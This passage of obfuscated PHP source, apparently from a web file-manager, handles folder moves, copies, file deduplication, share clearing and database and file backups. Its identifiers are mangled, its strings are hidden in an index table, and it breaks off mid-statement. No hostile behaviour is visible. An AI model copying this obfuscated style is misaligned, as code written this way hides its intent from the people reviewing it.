$·°ÄËá = !0; } } else { if ($ûØ¯ô—Ğ == REPEAT_RENAME || $ûØ¯ô—Ğ == REPEAT_RENAME_FOLDER) { $ é¢§ƒ¸ = $this->fileNameAuto($òø–û‹ß, $ é¢§ƒ¸, $ûØ¯ô—Ğ, $ŞàçÄ«¡); $øæäÊ = $this->_moveForce($âèû¦¶”, $òø–û‹ß, $ é¢§ƒ¸); } else { $¯¥ÅíÄ— = $this->sourceInfoCache($½—ÍèÑÕ); $ÒÛ¶Ôàì = $this->fileHistory($¯¥ÅíÄ—, $”€Êü©[$ Îó¬¥[563]], $”€Êü©[$ Îó¬¥[90]]); if ($ÒÛ¶Ôàì) { $ÈŸ¿ß÷[$ Îó¬¥[658]][] = $”€Êü©[$ Îó¬¥[563]]; } $·°ÄËá = !0; } } if ($·°ÄËá) { $ÈŸ¿ß÷[$ Îó¬¥[689]] = !0; } return $øæäÊ; } private function _moveForce($ñ‹úÙ½Æ, $«Ü¸à‘å, $úÏó¶ıÔ) { $İßŞ”§¨ =& $_SERVER[¤øïŠ‹²]; $¶’Ì…š = $this->sourceInfo($ñ‹úÙ½Æ); $¾«£½£Â = $this->sourceInfo($«Ü¸à‘å); $ˆÚÔı á = $¶’Ì…š[$İßŞ”§¨[506]] == $İßŞ”§¨[102]; $èïªú = array($İßŞ”§¨[498] => $¾«£½£Â[$İßŞ”§¨[204]], $İßŞ”§¨[681] => $¾«£½£Â[$İßŞ”§¨[610]] . $¾«£½£Â[$İßŞ”§¨[204]] . $İßŞ”§¨[50], $İßŞ”§¨[677] => $¾«£½£Â[$İßŞ”§¨[201]], $İßŞ”§¨[678] => $¾«£½£Â[$İßŞ”§¨[595]], $İßŞ”§¨[680] => USER_ID, $İßŞ”§¨[515] => $úÏó¶ıÔ); $Ú¸«š‘ = $¶’Ì…š[$İßŞ”§¨[201]] == SourceModel::TYPE_GROUP && $¾«£½£Â[$İßŞ”§¨[201]] == SourceModel::TYPE_GROUP && $¶’Ì…š[$İßŞ”§¨[595]] == $¾«£½£Â[$İßŞ”§¨[595]]; if (!$Ú¸«š‘ && $this->moveClearAuth) { Model($İßŞ”§¨[593])->authClear($ñ‹úÙ½Æ); } $ëš¹ı¹ = $¶’Ì…š[$İßŞ”§¨[526]] == $İßŞ”§¨[102] && $¾«£½£Â[$İßŞ”§¨[526]] != $İßŞ”§¨[102]; if ($ëš¹ı¹) { $èïªú[$İßŞ”§¨[525]] = 0; } if ($ˆÚÔı á) { $‚¶°‰¥  = array($İßŞ”§¨[681] => array($İßŞ”§¨[641], $¶’Ì…š[$İßŞ”§¨[610]] . $¶’Ì…š[$İßŞ”§¨[204]] . $İßŞ”§¨[642])); $õ²ºß” = $¶’Ì…š[$İßŞ”§¨[610]] . $¶’Ì…š[$İßŞ”§¨[204]] . $İßŞ”§¨[50]; $µ•ó¹ = $¾«£½£Â[$İßŞ”§¨[610]] . $¾«£½£Â[$İßŞ”§¨[204]] . $İßŞ”§¨[50] . $¶’Ì…š[$İßŞ”§¨[204]] . $İßŞ”§¨[50]; $ªëäÕ•Ü = array($İßŞ”§¨[681] => array($İßŞ”§¨[690], "\x72\x65\160\x6c\x61\143\145\50\160\141\162\145\156\164\x4c\x65\x76\145\154\x2c\x27{$õ²ºß”}\x27\x2c\x27{$µ•ó¹}\x27\x29"), $İßŞ”§¨[677] => $¾«£½£Â[$İßŞ”§¨[201]], $İßŞ”§¨[678] => $¾«£½£Â[$İßŞ”§¨[595]]); if ($ëš¹ı¹) { $ªëäÕ•Ü[$İßŞ”§¨[525]] = 0; } $this->where($‚¶°‰¥ )->data($ªëäÕ•Ü)->save(); } $this->where(array($İßŞ”§¨[512] => $ñ‹úÙ½Æ))->data($èïªú)->save(); return $ñ‹úÙ½Æ; } private function clearShare($Ìà˜’İ³, $•ñ–ÓË) { $†Ïô‰ =& $_SERVER[¤øïŠ‹²]; $—©áıË› = $this->sourceInfo($Ìà˜’İ³); $ÏÓ˜Ó£Á = $this->sourceInfo($•ñ–ÓË); if ($—©áıË›[$†Ïô‰[595]] == $ÏÓ˜Ó£Á[$†Ïô‰[595]] && $—©áıË›[$†Ïô‰[201]] == $†Ïô‰[691]) { return; } $ã×ƒÜëÀ = array($†Ïô‰[610] => array($†Ïô‰[641], $—©áıË›[$†Ïô‰[610]] . $Ìà˜’İ³ . $†Ïô‰[642])); $â–ößµ˜ = $this->field($†Ïô‰[512])->where($ã×ƒÜëÀ)->getField($†Ïô‰[204], !0); if (!$â–ößµ˜) { return; } $ã×ƒÜëÀ = array($†Ïô‰[204] => array($†Ïô‰[7], $â–ößµ˜), $†Ïô‰[692] => 1); $Ú¶å°¨ = Model($†Ïô‰[693])->field($†Ïô‰[694])->where($ã×ƒÜëÀ)->select(); if (!$Ú¶å°¨) { return; } $Ú¶å°¨ = array_to_keyvalue($Ú¶å°¨, $†Ïô‰[12], $†Ïô‰[694]); $ã×ƒÜëÀ = array($†Ïô‰[694] => array($†Ïô‰[7], $Ú¶å°¨)); Model($†Ïô‰[693])->where($ã×ƒÜëÀ)->save(array($†Ïô‰[692] => 0)); Model($†Ïô‰[695])->where($ã×ƒÜëÀ)->delete(); } public function copyFolderFromIO($•íº©ŞŒ, $±—ŸÇÀ£, $»‹•´ü®, $·—´ÉŒ, $äÊÀ¨˜ñ, $—£çèù = false) { $»¦¤ñ÷ =& $_SERVER[¤øïŠ‹²]; $¡ÕçÈ™Œ = array($»¦¤ñ÷[659] => array(), $»¦¤ñ÷[660] => array(), $»¦¤ñ÷[658] => array(), $»¦¤ñ÷[696] => array()); $Ò˜ú°ô³ = $—£çèù ? $—£çèù : $•íº©ŞŒ->pathThis($±—ŸÇÀ£); $¨ª«»×œ = $this->fileNameExist($»‹•´ü®, $Ò˜ú°ô³); $¡Á‹«İÙ = $this->mkdir($»‹•´ü®, $Ò˜ú°ô³, $·—´ÉŒ); if (!$¨ª«»×œ || $·—´ÉŒ == REPEAT_RENAME_FOLDER) { $·—´ÉŒ = !1; } if ($¨ª«»×œ) { $this->_childrenAllMake($¨ª«»×œ); } Hook::trigger($»¦¤ñ÷[697]); $ß¶şÍÍ = KodIO::ioFileDriverGet($»¦¤ñ÷[504] . $»‹•´ü® . $»¦¤ñ÷[414]); $this->_copyChildTo($•íº©ŞŒ, $±—ŸÇÀ£, $¡Á‹«İÙ, $·—´ÉŒ, $¡ÕçÈ™Œ, $äÊÀ¨˜ñ, $ß¶şÍÍ); Hook::trigger($»¦¤ñ÷[698]); if ($¡Á‹«İÙ) { $this->folderSizeResetChildren($¡Á‹«İÙ); } $this->_childrenListClear(); Model($»¦¤ñ÷[661])->addAll($¡ÕçÈ™Œ[$»¦¤ñ÷[659]], array(), !0); Model($»¦¤ñ÷[662])->eventCopy($¡Á‹«İÙ); $this->saveAll($¡ÕçÈ™Œ[$»¦¤ñ÷[660]]); Model($»¦¤ñ÷[566])->linkAdd($¡ÕçÈ™Œ[$»¦¤ñ÷[658]]); Model($»¦¤ñ÷[566])->remove($¡ÕçÈ™Œ[$»¦¤ñ÷[696]]); $this->folderSizeReset($»‹•´ü®); $this->updateModifyTime($»‹•´ü®); return $¡Á‹«İÙ; } private function _copyChildTo($¥ßŠ£À‚, $½ÀÆ²Ø°, $Ôƒœƒ”, $¦ÛÃœè, &$ßáÜÌØ, $Ç„ÂÃÊ, $ŒÛ½ñÙµ) { $ë³à€×® =& $_SERVER[¤øïŠ‹²]; $Š ï‹‡ø = $this->sourceInfoCache($Ôƒœƒ”); $ªÈ‰ãÍ± = $¥ßŠ£À‚->listPath($½ÀÆ²Ø°); $ªÈ‰ãÍ± = $ªÈ‰ãÍ± ? $ªÈ‰ãÍ± : array($ë³à€×®[97] => array(), $ë³à€×®[96] => array()); $•¤Š¯Ğú = array_merge($ªÈ‰ãÍ±[$ë³à€×®[97]], $ªÈ‰ãÍ±[$ë³à€×®[96]]); $ìÍõØ¯¬ = $this->_addFiles($¥ßŠ£À‚, $ŒÛ½ñÙµ, $ªÈ‰ãÍ±[$ë³à€×®[97]], $Ç„ÂÃÊ); $•Ä¯¯¸ = array(); foreach ($•¤Š¯Ğú as &$ÀŠ‹¨ Å) { if (isset($ìÍõØ¯¬[$ÀŠ‹¨ Å[$ë³à€×®[32]]])) { $ÀŠ‹¨ Å = $ìÍõØ¯¬[$ÀŠ‹¨ Å[$ë³à€×®[32]]]; } $ÀŠ‹¨ Å[$ë³à€×®[506]] = $ÀŠ‹¨ Å[$ë³à€×®[33]] == $ë³à€×®[89]; $ÀŠ‹¨ Å[$ë³à€×®[507]] = substr(_get($ÀŠ‹¨ Å, $ë³à€×®[179], $ë³à€×®[12]), 0, 10); $ÀŠ‹¨ Å[$ë³à€×®[90]] = _get($ÀŠ‹¨ Å, $ë³à€×®[90], 0); $ÀŠ‹¨ Å[$ë³à€×®[563]] = _get($ÀŠ‹¨ Å, $ë³à€×®[563], 0); if (!isset($ÀŠ‹¨ Å[$ë³à€×®[699]]) && $ÀŠ‹¨ Å[$ë³à€×®[563]]) { $ßáÜÌØ[$ë³à€×®[696]][] = $ÀŠ‹¨ Å[$ë³à€×®[563]]; } if ($¦ÛÃœè) { $Ãî’«Å¦ = $this->fileNameExistCache($Ôƒœƒ”, $ÀŠ‹¨ Å[$ë³à€×®[32]]); if ($Ãî’«Å¦) { if ($ÀŠ‹¨ Å[$ë³à€×®[506]] || $¦ÛÃœè == REPEAT_SKIP) { continue; } if ($¦ÛÃœè == REPEAT_REPLACE) { $­»ÄÂ‰ = $this->sourceInfoCache($Ãî’«Å¦); $×Æõü¨Œ = $this->fileHistory($­»ÄÂ‰, $ÀŠ‹¨ Å[$ë³à€×®[563]], $ÀŠ‹¨ Å[$ë³à€×®[90]]); if ($×Æõü¨Œ) { $ßáÜÌØ[$ë³à€×®[658]][] = $ÀŠ‹¨ Å[$ë³à€×®[563]]; } continue; } else { if ($¦ÛÃœè == REPEAT_RENAME) { $ÀŠ‹¨ Å[$ë³à€×®[32]] = $this->fileNameAutoCache($Ôƒœƒ”, $ÀŠ‹¨ Å[$ë³à€×®[32]], $¦ÛÃœè, !1); } } } } if (!$ÀŠ‹¨ Å[$ë³à€×®[506]] && $ÀŠ‹¨ Å[$ë³à€×®[563]] == 0) { continue; } if (!$ÀŠ‹¨ Å[$ë³à€×®[506]] && $ÀŠ‹¨ Å[$ë³à€×®[563]]) { $ßáÜÌØ[$ë³à€×®[658]][] = $ÀŠ‹¨ Å[$ë³à€×®[563]]; } $•Ä¯¯¸[] = $this->_makeItemData($ÀŠ‹¨ Å, $Š ï‹‡ø, $ÀŠ‹¨ Å[$ë³à€×®[32]]); } unset($ÀŠ‹¨ Å); if (!empty($•Ä¯¯¸)) { $this->addAll($•Ä¯¯¸); $this->_childrenListSelect($Ôƒœƒ”); } $…·ÖöéÛ = $this->_childrenList($Ôƒœƒ”); $…·ÖöéÛ = array_to_keyvalue($…·ÖöéÛ, $ë³à€×®[32]); foreach ($•¤Š¯Ğú as $ÀŠ‹¨ Å) { $­»ÄÂ‰ = $…·ÖöéÛ[$ÀŠ‹¨ Å[$ë³à€×®[32]]]; $«‡¼«Œë = $­»ÄÂ‰[$ë³à€×®[204]]; $this->_copyApplyMeta($­»ÄÂ‰, $ßáÜÌØ); if ($ÀŠ‹¨ Å[$ë³à€×®[33]] == $ë³à€×®[89]) { $ÀŠ‹¨ Å[$ë³à€×®[98]] = $¥ßŠ£À‚->getPathInner($ÀŠ‹¨ Å[$ë³à€×®[98]]); $this->_copyChildTo($¥ßŠ£À‚, $ÀŠ‹¨ Å[$ë³à€×®[98]], $«‡¼«Œë, $¦ÛÃœè, $ßáÜÌØ, $Ç„ÂÃÊ, $ŒÛ½ñÙµ); } } } private function _addFiles($ò„…ºˆø, $† «¼áŞ, $‚º•şô, $¡ƒİÅˆç) { $íÀÛ×ÜÕ =& $_SERVER[¤øïŠ‹²]; if (!$‚º•şô || count($‚º•şô) == 0) { return array(); } $‡¥Ö÷‹Ø = array(); foreach ($‚º•şô as &$¾·îµÎÚ) { Hook::trigger($íÀÛ×ÜÕ[700], $¾·îµÎÚ); $¾·îµÎÚ[$íÀÛ×ÜÕ[98]] = $ò„…ºˆø->getPathInner($¾·îµÎÚ[$íÀÛ×ÜÕ[98]]); $”ÄÜª› = $ò„…ºˆø->hashSimple($¾·îµÎÚ[$íÀÛ×ÜÕ[98]]); $ö¯³»€ = $ò„…ºˆø->hashMd5($¾·îµÎÚ[$íÀÛ×ÜÕ[98]]); if (strlen($ö¯³»€) > 10 && !isset($‡¥Ö÷‹Ø[$ö¯³»€])) { $‡¥Ö÷‹Ø[$ö¯³»€] = array(); } $¾·îµÎÚ[$íÀÛ×ÜÕ[701]] = $”ÄÜª›; $¾·îµÎÚ[$íÀÛ×ÜÕ[569]] = $ö¯³»€; $‡¥Ö÷‹Ø[$ö¯³»€][] =& $¾·îµÎÚ; if (count($‡¥Ö÷‹Ø[$ö¯³»€]) > 1) { $¾·îµÎÚ[$íÀÛ×ÜÕ[699]] = !0; } Hook::trigger($íÀÛ×ÜÕ[702], $¾·îµÎÚ); } unset($¾·îµÎÚ); $‰îä‹¦Ü = array($íÀÛ×ÜÕ[569] => array($íÀÛ×ÜÕ[7], array_keys($‡¥Ö÷‹Ø))); $—›¯Îªğ = Model($íÀÛ×ÜÕ[703]); $ÖêÎÕ·‹ = $—›¯Îªğ->where($‰îä‹¦Ü)->select(); $ÖêÎÕ·‹ = $ÖêÎÕ·‹ ? $ÖêÎÕ·‹ : array(); foreach ($ÖêÎÕ·‹ as $şÑÎ·) { if (!isset($‡¥Ö÷‹Ø[$şÑÎ·[$íÀÛ×ÜÕ[569]]])) { continue; } $Ö±‚İÂİ = $‡¥Ö÷‹Ø[$şÑÎ·[$íÀÛ×ÜÕ[569]]]; foreach ($Ö±‚İÂİ as &$¾·îµÎÚ) { $¾·îµÎÚ[$íÀÛ×ÜÕ[563]] = $şÑÎ·[$íÀÛ×ÜÕ[563]]; $¾·îµÎÚ[$íÀÛ×ÜÕ[699]] = !0; } unset($¾·îµÎÚ); } $Á­¶ÎĞµ = array(); foreach ($‚º•şô as $âƒ“ûÃÉ) { Hook::trigger($íÀÛ×ÜÕ[704], $âƒ“ûÃÉ); if (isset($âƒ“ûÃÉ[$íÀÛ×ÜÕ[699]]) && $âƒ“ûÃÉ[$íÀÛ×ÜÕ[699]]) { Hook::trigger($íÀÛ×ÜÕ[705], $âƒ“ûÃÉ); continue; } $Éƒƒ•ÒÛ = $ò„…ºˆø->getPathInner($âƒ“ûÃÉ[$íÀÛ×ÜÕ[98]]); $Õ€ç·è‹ = $—›¯Îªğ->addFileMake($Éƒƒ•ÒÛ, $† «¼áŞ, $âƒ“ûÃÉ[$íÀÛ×ÜÕ[90]], $âƒ“ûÃÉ[$íÀÛ×ÜÕ[701]], $âƒ“ûÃÉ[$íÀÛ×ÜÕ[569]], $âƒ“ûÃÉ[$íÀÛ×ÜÕ[32]], $¡ƒİÅˆç); Hook::trigger($íÀÛ×ÜÕ[705], $âƒ“ûÃÉ); if (!is_array($Õ€ç·è‹)) { continue; } $Á­¶ÎĞµ[] = $Õ€ç·è‹; } $—›¯Îªğ->addAll($Á­¶ÎĞµ); $‰îä‹¦Ü = array($íÀÛ×ÜÕ[569] => array($íÀÛ×ÜÕ[7], array_keys($‡¥Ö÷‹Ø))); $ÖêÎÕ·‹ = $—›¯Îªğ->where($‰îä‹¦Ü)->select(); $ÖêÎÕ·‹ = $ÖêÎÕ·‹ ? $ÖêÎÕ·‹ : array(); foreach ($ÖêÎÕ·‹ as $şÑÎ·) { if (!isset($‡¥Ö÷‹Ø[$şÑÎ·[$íÀÛ×ÜÕ[569]]])) { continue; } $¿ŒæÄ‡è =& $‡¥Ö÷‹Ø[$şÑÎ·[$íÀÛ×ÜÕ[569]]]; foreach ($¿ŒæÄ‡è as &$¾·îµÎÚ) { $¾·îµÎÚ[$íÀÛ×ÜÕ[563]] = $şÑÎ·[$íÀÛ×ÜÕ[563]]; } unset($¾·îµÎÚ); } $ö€ı…÷ô = array(); foreach ($‚º•şô as $ûı…ĞÊ¶) { $ö€ı…÷ô[$ûı…ĞÊ¶[$íÀÛ×ÜÕ[32]]] = $ûı…ĞÊ¶; } return $ö€ı…÷ô; } } goto aÇÅë¾‰˜ã; d©Úƒ…èÁ¬: class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->model = Model($_SERVER[¤øïŠ‹²][849]); $this->init(); $this->keep(); } public function init() { $§Œ…ÎÉ =& $_SERVER[¤øïŠ‹²]; $this->isManual(); self::$name = date($§Œ…ÎÉ[850]); if (!($ÙÑï»úÙ = $this->model->lastItem())) { $ÙÑï»úÙ = $this->initData(); } else { self::$name = $ÙÑï»úÙ[$§Œ…ÎÉ[32]]; if ($ÙÑï»úÙ[$§Œ…ÎÉ[851]] == $§Œ…ÎÉ[102]) { self::$name = date($§Œ…ÎÉ[272]); $º…ùˆ¶½ = intval(_get($ÙÑï»úÙ, $§Œ…ÎÉ[852], 0)); if (self::$manual == 0 && $ÙÑï»úÙ[$§Œ…ÎÉ[32]] == self::$name) { $this->model->remove($ÙÑï»úÙ[$§Œ…ÎÉ[493]]); } $ÙÑï»úÙ = $this->initData($º…ùˆ¶½, $ÙÑï»úÙ[$§Œ…ÎÉ[853]]); } else { $this->checkStore($ÙÑï»úÙ[$§Œ…ÎÉ[853]]); } } self::$option = $ÙÑï»úÙ; } private function isManual() { $ºÒÌÔ•¤ = _get($GLOBALS, $_SERVER[¤øïŠ‹²][854], 0); $ºÒÌÔ•¤ = intval($ºÒÌÔ•¤); self::$manual = $ºÒÌÔ•¤ && $ºÒÌÔ•¤ == 1 ? 1 : 0; } private function initData($Ø’„›Àë = 0, $ÈúĞ£¸› = '') { $¸˜ŠÃÂÂ =& $_SERVER[¤øïŠ‹²]; $˜ìÍãÂò = $this->model->config(); if ($ÈúĞ£¸› && $˜ìÍãÂò[$¸˜ŠÃÂÂ[853]] != $ÈúĞ£¸›) { $Ø’„›Àë = 0; } $this->checkStore($˜ìÍãÂò[$¸˜ŠÃÂÂ[853]]); if (self::$manual == 1) { self::$name .= $¸˜ŠÃÂÂ[11] . date($¸˜ŠÃÂÂ[855]); } $™À‡ğ²Ê = array($¸˜ŠÃÂÂ[853] => $˜ìÍãÂò[$¸˜ŠÃÂÂ[853]], $¸˜ŠÃÂÂ[32] => self::$name, $¸˜ŠÃÂÂ[851] => 0, $¸˜ŠÃÂÂ[181] => $˜ìÍãÂò[$¸˜ŠÃÂÂ[181]], $¸˜ŠÃÂÂ[856] => self::$manual, $¸˜ŠÃÂÂ[857] => array($¸˜ŠÃÂÂ[858] => array($¸˜ŠÃÂÂ[851] => 0), $¸˜ŠÃÂÂ[859] => array($¸˜ŠÃÂÂ[851] => 0, $¸˜ŠÃÂÂ[860] => 0, $¸˜ŠÃÂÂ[861] => 0, $¸˜ŠÃÂÂ[33] => $¸˜ŠÃÂÂ[12], $¸˜ŠÃÂÂ[862] => 0, $¸˜ŠÃÂÂ[863] => 0), $¸˜ŠÃÂÂ[864] => array($¸˜ŠÃÂÂ[851] => 0, $¸˜ŠÃÂÂ[860] => 0, $¸˜ŠÃÂÂ[861] => 0, $¸˜ŠÃÂÂ[862] => 0, $¸˜ŠÃÂÂ[863] => 0), $¸˜ŠÃÂÂ[243] => array($¸˜ŠÃÂÂ[851] => 0, $¸˜ŠÃÂÂ[865] => 0, $¸˜ŠÃÂÂ[866] => 0, $¸˜ŠÃÂÂ[867] => 0, $¸˜ŠÃÂÂ[868] => 0, $¸˜ŠÃÂÂ[563] => $Ø’„›Àë, $¸˜ŠÃÂÂ[862] => 0, $¸˜ŠÃÂÂ[863] => 0)), $¸˜ŠÃÂÂ[862] => time(), $¸˜ŠÃÂÂ[863] => 0); $Øà…şØã = $this->model->insert($™À‡ğ²Ê); $™À‡ğ²Ê[$¸˜ŠÃÂÂ[493]] = $Øà…şØã; return $™À‡ğ²Ê; } private function checkStore($•£Š€Íå) { $ó©Üåïú = Model($_SERVER[¤øïŠ‹²][869]); $å°ššï§ = $ó©Üåïú->listData($•£Š€Íå); $ó©Üåïú->checkConfig($å°ššï§); } public static function get() { if (!self::$option) { $ê ÃÜŠ = Model($_SERVER[¤øïŠ‹²][849]); $ãÇÊ¤˜ü = $ê ÃÜŠ->findByName(self::$name); $ê ÃÜŠ->parseContent($ãÇÊ¤˜ü); self::$option = $ãÇÊ¤˜ü; } return self::$option; } public static function set($ıĞÖŠ‘) { $Èû·èô =& $_SERVER[¤øïŠ‹²]; $ ¸¶Û—î = self::get(); foreach ($ıĞÖŠ‘ as $Á«¨àÑ => $¢¾‹Ş¡) { array_set_value($ ¸¶Û—î, $Á«¨àÑ, $¢¾‹Ş¡); } Model($Èû·èô[849])->update($ ¸¶Û—î[$Èû·èô[493]], $ ¸¶Û—î); self::$option = $ ¸¶Û—î; return self::$option; } public function keep() { $Ç±éÚÏÑ =& $_SERVER[¤øïŠ‹²]; $Åå³øü = self::get(); if (_get($Åå³øü, $Ç±éÚÏÑ[870], 0) == $Ç±éÚÏÑ[102]) { return; } $this->backupKeep($Åå³øü); self::set(array($Ç±éÚÏÑ[870] => 1)); } private function backupKeep($ç°ŒÁì) { $ÌÌÓ˜õŞ =& $_SERVER[¤øïŠ‹²]; if (self::$manual == 1) { return; } $™„œƒ¥Ü = $this->model->listData(); if (empty($™„œƒ¥Ü)) { return; } $æ¶èĞ¤ = array(); $ş›Ä³” = array(); $¡½ÎÛÀ– = date($ÌÌÓ˜õŞ[871], strtotime($ÌÌÓ˜õŞ[872])); foreach ($™„œƒ¥Ü as $£½ÖÒŞİ => $¨ØÔõ€§) { $’Ë¨ñø = $¨ØÔõ€§[$ÌÌÓ˜õŞ[32]]; if ($£½ÖÒŞİ < 7 || $¨ØÔõ€§[$ÌÌÓ˜õŞ[856]] == $ÌÌÓ˜õŞ[102]) { $æ¶èĞ¤[] = $’Ë¨ñø; continue; } $¼öˆ¿áô = substr($’Ë¨ñø, 0, 6); if ($¼öˆ¿áô < $¡½ÎÛÀ–) { continue; } if (!isset($ş›Ä³”[$¼öˆ¿áô]) || $’Ë¨ñø < $ş›Ä³”[$¼öˆ¿áô]) { $ş›Ä³”[$¼öˆ¿áô] = $’Ë¨ñø; } if (substr($’Ë¨ñø, 6, 2) == $ÌÌÓ˜õŞ[873]) { $ş›Ä³”[$¼öˆ¿áô] = $’Ë¨ñø; } } $æ¶èĞ¤ = array_merge($æ¶èĞ¤, array_values($ş›Ä³”)); $æ¶èĞ¤ = array_unique($æ¶èĞ¤); foreach ($™„œƒ¥Ü as $¨ØÔõ€§) { $’Ë¨ñø = $¨ØÔõ€§[$ÌÌÓ˜õŞ[32]]; if (!empty($’Ë¨ñø) && in_array($’Ë¨ñø, $æ¶èĞ¤)) { continue; } $this->model->remove($¨ØÔõ€§[$ÌÌÓ˜õŞ[493]]); $”£¼á¿µ = $this->backupPath($ç°ŒÁì); IO::remove($”£¼á¿µ, !1); } } private function backupPath($‰¹æ±¬Ã) { $±äúÏŞ =& $_SERVER[¤øïŠ‹²]; static $ƒì½ˆ«ó = null; if (is_null($ƒì½ˆ«ó)) { $ƒì½ˆ«ó = Model($±äúÏŞ[874])->get($±äúÏŞ[875]); } $±‘š„šı = $‰¹æ±¬Ã[$±äúÏŞ[32]]; $†ş¥­“ = substr(md5($±äúÏŞ[876] . $ƒì½ˆ«ó . $±‘š„šı), 0, 8); return "\x7b\x69\x6f\x3a{$‰¹æ±¬Ã[$±äúÏŞ[853]]}\175\x2f\x64\x61\x74\x61\142\x61\163\145\x2f\142\141\x63\153\x75\x70\57" . $±‘š„šı . $±äúÏŞ[11] . $†ş¥­“; } public function db() { $µÑÍ±í =& $_SERVER[¤øïŠ‹²]; $³çûº¸À = self::get(); if (_get($³çûº¸À, $µÑÍ±í[877], 0) == $µÑÍ±í[102]) { return !0; } $èš„ĞÎˆ = new BackupDb(); if (!$èš„ĞÎˆ->index()) { return !1; } self::set(array($µÑÍ±í[877] => 1)); return !0; } public function dbFile() { $›Š“ùÊ¯ =& $_SERVER[¤øïŠ‹²]; $ĞÈ¶Ì¸Ò = self::get(); if (_get($ĞÈ¶Ì¸Ò, $›Š“ùÊ¯[878], 0) == $›Š“ùÊ¯[102]) { return !0; } $ÑÍÌŞ‰Ø = new BackupDbFile(); if (!$ÑÍÌŞ‰Ø->index()) { return !1; } self::set(array($›Š“ùÊ¯[878] => 1)); return !0; } public function file() { $ßë—ûÀ =& $_SERVER[¤øïŠ‹²]; $™ì³”Ö = self::get(); if (_get($™ì³”Ö, $ßë—ûÀ[879], 0) == $ßë—ûÀ[102]) { return !0; } if ($™ì³”Ö[$ßë—ûÀ[181]] == $ßë—ûÀ[880]) { $•¬ô˜ÃÈ = new BackupFile(); if (!$•¬ô˜ÃÈ->index()) { return !1; } } self::set(array($ßë—ûÀ[879] => 1, $ßë—ûÀ[851] => 1)); return !0; } public static function log($À˜ª¬­) { write_log($À˜ª¬­, $_SERVER[¤øïŠ‹²][881]); } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $¡Ş¦èû¹ =& $_SERVER[¤øïŠ‹²]; $›†ô¨­Î = Backup::get(); self::$io = $›†ô¨­Î[$¡Ş¦èû¹[853]]; self::$name = $›†ô¨­Î[$¡Ş¦èû¹[32]]; $üæáÅÂì = new DbManage(); $ô‘¡™×¼ = $üæáÅÂì->dbType(); $šÅÔğ¬‘ = array($¡Ş¦èû¹[882] => $ô‘¡™×¼, $¡Ş¦èû¹[883] => time()); Backup::set($šÅÔğ¬‘); $½‹Ùë¥¶ = $this->tmpFilesPath() . $¡Ş¦èû¹[884] . self::$name . $¡Ş¦èû¹[8]; del_dir($½‹Ùë¥¶); mk_dir($½‹Ùë¥¶); $ı¾•Âá– = $ìå ÷’ª = 0; try { $Ú¯áìÍï = $üæáÅÂì->db()->getTables(); } catch (Exception $ÉªÁî¿˜) { Backup::log($¡Ş¦èû¹[885] . $ÉªÁî¿˜->getMessage()); return !1; } $Ú¯áìÍï = array_diff($Ú¯áìÍï, array($¡Ş¦èû¹[886], $¡Ş¦èû¹[887])); foreach ($Ú¯áìÍï as $ÏÙÍÏŒ­) { if ($ÏÙÍÏŒ­ == $¡Ş¦èû¹[888]) { continue; } $ı¾•Âá– += $üæáÅÂì->model($ÏÙÍÏŒ­)->count(); } $ÕÁïÃ = new Task($¡Ş¦èû¹[889], $¡Ş¦èû¹[881], $ı¾•Âá–, LNG($¡Ş¦èû¹[890]) . $¡Ş¦èû¹[891] . LNG($¡Ş¦èû¹[892])); $GLOBALS[$¡Ş¦èû¹[893]] = self::$name; foreach ($Ú¯áìÍï as $ÏÙÍÏŒ­) { $½Òßı¡¶ = $½‹Ùë¥¶ . $ÏÙÍÏŒ­ . $¡Ş¦èû¹[894]; if ($ÏÙÍÏŒ­ == $¡Ş¦èû¹[888]) { @touch($½Òßı¡¶); continue; } $šÆšÔ¯É = null; if ($ÏÙÍÏŒ­ == $¡Ş¦èû¹[895] && $›†ô¨­Î[$¡Ş¦èû¹[181]] == $¡Ş¦èû¹[880]) { $šÆšÔ¯É = self::$io; } $ìå ÷’ª += $üæáÅÂì->sqlFromDb($ÏÙÍÏŒ­, $½Òßı¡¶, $ÕÁïÃ, $šÆšÔ¯É); } unset($GLOBALS[$¡Ş¦èû¹[893]]); $ÕÁïÃ->end(); if ($ìå ÷’ª > $ı¾•Âá–) { $ı¾•Âá– = $ìå ÷’ª; } $šÅÔğ¬‘ = array($¡Ş¦èû¹[882] => $ô‘¡™×¼, $¡Ş¦èû¹[877] => 1, $¡Ş¦èû¹[896] => $ı¾•Âá–, $¡Ş¦èû¹[897] => $ìå ÷’ª, $¡Ş¦èû¹[898] => time()); Backup::set($šÅÔğ¬‘); if ($ı¾•Âá– - $ìå ÷’ª > 0) { $‰×çá‡¢ = $¡Ş¦èû¹[899]; if (!stristr(I18n::getType(), $¡Ş¦èû¹[900])) { $‰×çá‡¢ = $¡Ş¦èû¹[901]; } Backup::log(array($‰×çá‡¢, $šÅÔğ¬‘)); return !1; } return !0; } private function tmpFilesPath() { $ØĞôê =& $_SERVER[¤øïŠ‹²]; $‰Úöí‹Ë = TEMP_FILES; if ($GLOBALS[$ØĞôê[6]][$ØĞôê[103]][$ØĞôê[902]]) { $‰Úöí‹Ë = $GLOBALS[$ØĞôê[6]][$ØĞôê[103]][$ØĞôê[902]]; if (!mk_dir($‰Úöí‹Ë) || !is_writable($‰Úöí‹Ë) || !IO::mkfile($‰Úöí‹Ë . $ØĞôê[903])) { $‰Úöí‹Ë = TEMP_FILES; } } return $‰Úöí‹Ë; } } class BackupDbFile { public function __construct() { } public function index() { $Ú““Ã¥ =& $_SERVER[¤øïŠ‹²]; $úÙ¢¬á´ = Backup::get(); $³Ğ÷ò¸Ï = $úÙ¢¬á´[$Ú““Ã¥[32]]; $¢ß§èÚä = $this->tmpFilesPath() . "\x62\141\143\153\165\x70\137{$³Ğ÷ò¸Ï}\57"; $âöŸé´² = $this->backupPath($úÙ¢¬á´); if (!($âöŸé´² = IO::mkdir($âöŸé´²))) { Backup::log($Ú““Ã¥[904] . $âöŸé´²); return !1; } $–ş†ß¼Ì = new DbManage(); $Å–™€Ì = $–ş†ß¼Ì->getSqlFile(); if (!$Å–™€Ì || !$Å–™€Ì[$Ú““Ã¥[905]] || !$Å–™€Ì[$Ú““Ã¥[13]]) { Backup::log($Ú““Ã¥[906]); return !1; } IO::move($Å–™€Ì[$Ú““Ã¥[905]], $¢ß§èÚä); IO::move($Å–™€Ì[$Ú““Ã¥[13]], $¢ß§èÚä); $–ş†ß¼Ì->mixBakList($¢ß§èÚä); $ ·æÌ« = IO::listPath($¢ß§èÚä); $õ‡Â‰´Ô = isset($ 